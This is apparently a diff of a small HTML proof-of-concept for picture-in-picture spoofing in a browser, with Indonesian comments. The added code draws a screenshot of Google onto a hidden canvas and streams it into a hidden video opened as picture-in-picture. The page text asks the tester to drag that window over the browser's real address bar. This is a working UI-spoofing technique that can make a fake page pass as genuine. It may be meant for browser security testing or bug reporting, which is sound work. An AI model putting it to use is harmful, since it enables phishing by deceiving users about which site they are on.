@@ -1,22 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>PiP PoC</title></head>
-<body style="font-family:sans-serif;padding:40px;background:#ffffff;">
-<h1>PiP Spoofing Test</h1>
-<video id="v" controls autoplay muted playsinline style="width:100%;" src="https://interactive-examples.mdn.mozilla.net/media/cc0-videos/flower.mp4"></video>
-<br><br>
-<button onclick="pip()" style="font-size:20px;padding:15px 30px;">Buka PiP</button>
-<p id="o"></p>
-<script>
-async function pip(){
-  try{
-    var v = document.getElementById('v');
-    await v.requestPictureInPicture();
-    document.getElementById('o').innerText = 'PiP opened. Coba geser PiP-nya sampe nutupin address bar Firefox. Bisa gak?';
-  }catch(e){
-    document.getElementById('o').innerText = 'Blocked: ' + e;
-  }
-}
-</script>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>PiP PoC</title>
+</head>
+<body style="font-family: sans-serif; padding: 40px; background: #ffffff;">
+  <h1>PiP Spoofing Test</h1>
+
+  <!-- Gambar screenshot Google lu, ini yang bakal jadi isi PiP -->
+  <!-- File google.jpg harus ada di folder yang sama -->
+  <img id="img" src="google.jpg" style="width: 100%; display: block;" alt="Google Spoof Preview">
+
+  <br><br>
+
+  <!-- Video ini disembunyiin, cuma buat jembatan ke PiP -->
+  <video id="v" autoplay muted playsinline style="width: 100%; display: none;"></video>
+  <canvas id="c" width="800" height="1400" style="display: none;"></canvas>
+
+  <br><br>
+  <button onclick="pip()" style="font-size: 20px; padding: 15px 30px;">Buka PiP</button>
+  <p id="o"></p>
+
+  <script>
+    var img = document.getElementById('img');
+    var canvas = document.getElementById('c');
+    var ctx = canvas.getContext('2d');
+    var video = document.getElementById('v');
+
+    // Tunggu gambar ke-load, terus gambar ke canvas
+    img.onload = function(){
+      ctx.drawImage(img, 0, 0, 800, 1400);
+      // Jadikan canvas jadi video stream buat PiP
+      var stream = canvas.captureStream(30);
+      video.srcObject = stream;
+      video.play();
+    };
+
+    async function pip(){
+      try{
+        await video.requestPictureInPicture();
+        document.getElementById('o').innerText = 'PiP opened. Isinya screenshot Google persis. Coba geser PiP-nya sampe nutupin address bar asli. Bisa gak?';
+      }catch(e){
+        document.getElementById('o').innerText = 'Blocked: ' + e;
+      }
+    }
+  </script>
 </body>
 </html>
